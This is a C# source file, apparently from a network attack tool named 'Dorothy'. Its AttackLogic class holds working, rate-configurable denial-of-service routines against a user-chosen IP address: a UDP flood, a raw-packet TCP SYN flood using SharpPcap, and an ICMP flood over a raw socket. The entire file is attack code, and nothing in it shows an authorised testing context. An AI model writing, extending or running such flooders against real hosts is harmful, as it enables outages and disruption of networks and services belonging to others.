using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Net.NetworkInformation;
using System.Threading.Tasks;
using System.Diagnostics; // Added for Stopwatch
using System.Security.Principal; // Added for WindowsIdentity and WindowsPrincipal
using SharpPcap;
using PacketDotNet;
using PacketDotNet.Utils;

namespace Dorothy
{
    public class AttackLogic
    {
        private volatile bool _stopAttack = false;

        // Method to start the UDP flood
        public Task StartUdpFlood(string targetIp, int targetPort, int mbps, Action<string> log)
        {
            _stopAttack = false;
            log($"Debug: Entering StartUdpFlood method");
            return Task.Run(async () =>
            {
                try
                {
                    log($"Debug: Creating UdpClient");
                    using (UdpClient udpClient = new UdpClient())
                    {
                        IPEndPoint targetEndpoint = new IPEndPoint(IPAddress.Parse(targetIp), targetPort);
                        log($"Debug: Target endpoint created: {targetEndpoint}");

                        byte[] buffer = new byte[1024]; // 1KB packet size
                        new Random().NextBytes(buffer); // Fill buffer with random data
                        log($"Debug: Buffer created with size: {buffer.Length}");

                        long packetsSent = 0;
                        long bytesPerSecond = mbps * 125000L; // Convert Mbps to bytes per second
                        long bytesSent = 0;
                        DateTime startTime = DateTime.Now;

                        log($"Debug: UDP Flood initialized. Target: {targetEndpoint}, BytesPerSecond: {bytesPerSecond}");

                        while (!_stopAttack)
                        {
                            udpClient.Send(buffer, buffer.Length, targetEndpoint);
                            bytesSent += buffer.Length;
                            packetsSent++;

                            if (packetsSent % 1000 == 0) // Log every 1000 packets
                            {
                                log($"Debug: UDP Flood: {packetsSent} packets sent");
                            }

                            if (bytesSent >= bytesPerSecond || (DateTime.Now - startTime).TotalSeconds >= 1)
                            {
                                double elapsedSeconds = (DateTime.Now - startTime).TotalSeconds;
                                double actualMbps = (bytesSent * 8.0 / 1_000_000.0) / elapsedSeconds;
                                log($"Debug: UDP Flood: {packetsSent} packets sent, {actualMbps:F2} Mbps");

                                startTime = DateTime.Now;
                                bytesSent = 0;
                                packetsSent = 0;

                                if (actualMbps > mbps)
                                {
                                    log($"Debug: Rate exceeded, sleeping for 10ms");
                                    await Task.Delay(10);
                                }
                            }

                            // Calculate the delay needed to match the desired Mbps
                            double delay = (buffer.Length * 8.0 / (mbps * 1_000_000.0)) * 1000.0;
                            await Task.Delay((int)delay);
                        }
                    }
                }
                catch (Exception ex)
                {
                    log($"Debug: UDP Flood error: {ex.Message}");
                    log($"Debug: Stack trace: {ex.StackTrace}");
                }
                finally
                {
                    log("Debug: UDP Flood attack stopped.");
                }

                return Task.CompletedTask;
            });
        }

        // Method to start the TCP SYN flood
        public Task StartTcpSynFlood(string targetIp, int targetPort, int mbps, Action<string> log)
        {
            _stopAttack = false;
            log($"Debug: Entering StartTcpSynFlood method");

            return Task.Run(async () =>
            {
                IInjectionDevice? device = null;
                try
                {
                    log($"Debug: Using SharpPcap for TCP SYN flood");

                    var devices = SharpPcap.LibPcap.LibPcapLiveDeviceList.Instance;
                    if (devices.Count < 1)
                    {
                        log("Error: No devices were found on this machine");
                        return Task.CompletedTask;
                    }

                    // Select the first suitable device that can inject packets, is not a Bluetooth device, and has an IPv4 address
                    foreach (var dev in devices)
                    {
                        var injectionDevice = dev as IInjectionDevice;
                        if (injectionDevice == null)
                            continue;

                        var libPcapDevice = dev as SharpPcap.LibPcap.LibPcapLiveDevice;
                        if (libPcapDevice == null)
                            continue;

                        // Exclude Bluetooth devices
                        if (libPcapDevice.Description.Contains("Bluetooth", StringComparison.OrdinalIgnoreCase))
                            continue;

                        var addresses = libPcapDevice.Addresses;
                        foreach (var addr in addresses)
                        {
                            if (addr.Addr.ipAddress != null && addr.Addr.ipAddress.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                            {
                                device = injectionDevice;
                                break;
                            }
                        }
                        if (device != null)
                            break;
                    }

                    if (device == null)
                    {
                        log("Error: Unable to find an operational network device with an IPv4 address that is not Bluetooth");
                        return Task.CompletedTask;
                    }

                    log($"Debug: Selected device: {device.Description}");
                    device.Open(DeviceModes.Promiscuous, 1000);

                    var libPcapDeviceFinal = device as SharpPcap.LibPcap.LibPcapLiveDevice;
                    var localIp = GetLocalIpAddress(libPcapDeviceFinal);
                    if (localIp == null)
                    {
                        log("Error: Unable to determine the local IP address from the selected device");
                        return Task.CompletedTask;
                    }

                    var srcIp = IPAddress.Parse(localIp);
                    var dstIp = IPAddress.Parse(targetIp);
                    var srcPort = GetAvailablePort();

                    log($"Debug: Source IP: {srcIp}, Destination IP: {dstIp}, Source Port: {srcPort}");

                    long packetsSent = 0;
                    long bytesPerSecond = mbps * 125000L;
                    long bytesSent = 0;
                    DateTime startTime = DateTime.Now;

                    log($"Debug: TCP SYN Flood initialized. Target: {targetIp}:{targetPort}, BytesPerSecond: {bytesPerSecond}");

                    while (!_stopAttack)
                    {
                        try
                        {
                            if (libPcapDeviceFinal == null)
                            {
                                log("Error: libPcapDeviceFinal is null.");
                                return Task.CompletedTask;
                            }

                            EthernetPacket ethernetPacket = new EthernetPacket(
                                libPcapDeviceFinal.MacAddress,
                                PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"),
                                EthernetType.IPv4);

                            IPv4Packet ipPacket = new IPv4Packet(srcIp, dstIp)
                            {
                                TimeToLive = 64,
                                Protocol = (PacketDotNet.ProtocolType)System.Net.Sockets.ProtocolType.Tcp
                            };

                            TcpPacket tcpPacket = new TcpPacket((ushort)srcPort, (ushort)targetPort)
                            {
                                SequenceNumber = (uint)new Random().Next(1, int.MaxValue),
                                WindowSize = 8192
                                // Removed TcpFlags to fix the error
                            };
                            tcpPacket.Synchronize = true; // Set SYN flag

                            ipPacket.PayloadPacket = tcpPacket;
                            ethernetPacket.PayloadPacket = ipPacket;

                            device.SendPacket(ethernetPacket);

                            packetsSent++;
                            bytesSent += ethernetPacket.Bytes.Length;

                            if (packetsSent % 1000 == 0) // Log every 1000 packets
                            {
                                log($"Debug: TCP SYN Flood: {packetsSent} packets sent");
                            }

                            if (bytesSent >= bytesPerSecond || (DateTime.Now - startTime).TotalSeconds >= 1)
                            {
                                double elapsedSeconds = (DateTime.Now - startTime).TotalSeconds;
                                double actualMbps = (bytesSent * 8.0 / 1_000_000.0) / elapsedSeconds;
                                log($"Debug: TCP SYN Flood: {packetsSent} packets sent, {actualMbps:F2} Mbps");

                                startTime = DateTime.Now;
                                bytesSent = 0;
                                packetsSent = 0;

                                if (actualMbps > mbps)
                                {
                                    log($"Debug: Rate exceeded, sleeping for 10ms");
                                    await Task.Delay(10);
                                }
                            }

                            // Calculate the delay needed to match the desired Mbps
                            double delay = (ethernetPacket.Bytes.Length * 8.0 / (mbps * 1_000_000.0)) * 1000.0;
                            if (delay > 0)
                            {
                                await Task.Delay((int)delay);
                            }
                        }
                        catch (Exception ex)
                        {
                            log($"TCP SYN Flood error: {ex.Message}");
                            log($"Debug: Stack Trace: {ex.StackTrace}");
                        }
                    }
                }
                catch (Exception ex)
                {
                    log($"TCP SYN Flood error: {ex.Message}");
                    log($"Debug: Stack Trace: {ex.StackTrace}");
                }
                finally
                {
                    if (device != null)
                    {
                        device.Close();
                        device.Dispose();
                        log("Debug: Network device closed");
                    }
                    log("Debug: TCP SYN Flood attack stopped.");
                }

                return Task.CompletedTask;
            });
        }

        // Method to start the ICMP flood
        public Task StartIcmpFlood(string targetIp, int mbps, Action<string> log)
        {
            _stopAttack = false;
            log($"Debug: Entering StartIcmpFlood method");

            return Task.Run(async () =>
            {
                try
                {
                    log($"Debug: Creating raw socket for ICMP");
                    using (Socket icmpSocket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, System.Net.Sockets.ProtocolType.Icmp))
                    {
                        IPEndPoint targetEndpoint = new IPEndPoint(IPAddress.Parse(targetIp), 0);
                        byte[] buffer = new byte[1024]; // 1KB packet size
                        new Random().NextBytes(buffer); // Fill buffer with random data
                        log($"Debug: Buffer created with size: {buffer.Length}");

                        long packetsSent = 0;
                        long bytesPerSecond = mbps * 125000L; // Convert Mbps to bytes per second
                        long bytesSent = 0;
                        DateTime startTime = DateTime.Now;

                        log($"Debug: ICMP Flood initialized. Target: {targetIp}, BytesPerSecond: {bytesPerSecond}");

                        while (!_stopAttack)
                        {
                            try
                            {
                                icmpSocket.SendTo(buffer, targetEndpoint);
                                packetsSent++;
                                bytesSent += buffer.Length;
                            }
                            catch (SocketException ex)
                            {
                                log($"ICMP Flood error: {ex.Message}");
                            }

                            if (packetsSent % 1000 == 0) // Log every 1000 packets
                            {
                                log($"Debug: ICMP Flood: {packetsSent} packets sent");
                            }

                            if (bytesSent >= bytesPerSecond || (DateTime.Now - startTime).TotalSeconds >= 1)
                            {
                                double elapsedSeconds = (DateTime.Now - startTime).TotalSeconds;
                                double actualMbps = (bytesSent * 8.0 / 1_000_000.0) / elapsedSeconds;
                                log($"Debug: ICMP Flood: {packetsSent} packets sent, {actualMbps:F2} Mbps");

                                startTime = DateTime.Now;
                                bytesSent = 0;
                                packetsSent = 0;

                                if (actualMbps > mbps)
                                {
                                    log($"Debug: Rate exceeded, sleeping for 10ms");
                                    await Task.Delay(10);
                                }
                            }

                            // Calculate the delay needed to match the desired Mbps
                            double delay = (buffer.Length * 8.0 / (mbps * 1_000_000.0)) * 1000.0;
                            if (delay > 0)
                            {
                                await Task.Delay((int)delay);
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    log($"Debug: ICMP Flood error: {ex.Message}");
                    log($"Debug: Stack trace: {ex.StackTrace}");
                    return Task.CompletedTask;
                }
                finally
                {
                    log("Debug: ICMP Flood attack stopped.");
                }

                return Task.CompletedTask;
            });
        }

        private string? GetLocalIpAddress(SharpPcap.LibPcap.LibPcapLiveDevice? device)
        {
            if (device == null)
                return null;

            var addresses = device.Addresses;
            foreach (var addr in addresses)
            {
                if (addr.Addr.ipAddress != null && addr.Addr.ipAddress.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                {
                    return addr.Addr.ipAddress.ToString();
                }
            }
            return null;
        }

        private int GetAvailablePort()
        {
            var listener = new TcpListener(IPAddress.Any, 0);
            listener.Start();
            int port = ((IPEndPoint)listener.LocalEndpoint).Port;
            listener.Stop();
            return port;
        }

        public void StopAttack()
        {
            _stopAttack = true;
        }

        private bool IsRunningAsAdmin()
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }
    }
}